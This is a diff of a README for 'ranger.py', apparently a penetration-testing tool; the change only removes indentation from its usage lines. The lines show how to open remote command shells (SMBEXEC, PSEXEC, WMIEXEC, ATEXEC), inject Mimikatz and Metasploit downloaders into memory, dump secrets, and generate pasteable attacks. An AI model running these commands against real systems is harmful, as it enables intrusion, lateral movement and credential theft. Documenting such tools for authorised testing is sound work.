@@ -19,49 +19,49 @@ More functionality is being added, but at this time the tool uses the community 
 from repositories related to the PowerShell PowerView, PowerShell Mimikatz and Impacket teams.  
 
 Find Logged In Users
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout
+ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout
 
 SMBEXEC Command Shell:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
 
 PSEXEC Command Shell:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
 
 PSEXEC Command Execution:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
 
 WMIEXEC Command Execution:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
 
 WMIEXEC PowerShell Mimikatz Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
 
 WMIEXEC Metasploit web_downloader Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
 
 WMIEXEC Custom Code Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
 
 ATEXEC Command Execution:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
 
 ATEXEC PowerShell Mimikatz Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
 
 ATEXEC Metasploit web_downloader Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
 
 ATEXEC Custom Code Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
 
 SECRETSDUMP Custom Code Memory Injector:
-    ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
+ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
 
 Create Pasteable Mimikatz Attack:
-    ranger.py --invoker -q -v -vv -vvv
+ranger.py --invoker -q -v -vv -vvv
 
 Create Pasteable web_downloader Attack:
-    ranger.py --downloader -q -v -vv -vvv
+ranger.py --downloader -q -v -vv -vvv
 
 Create Pasteable Executor Attack:
-    ranger.py --executor -q -v -vv -vvv
+ranger.py --executor -q -v -vv -vvv
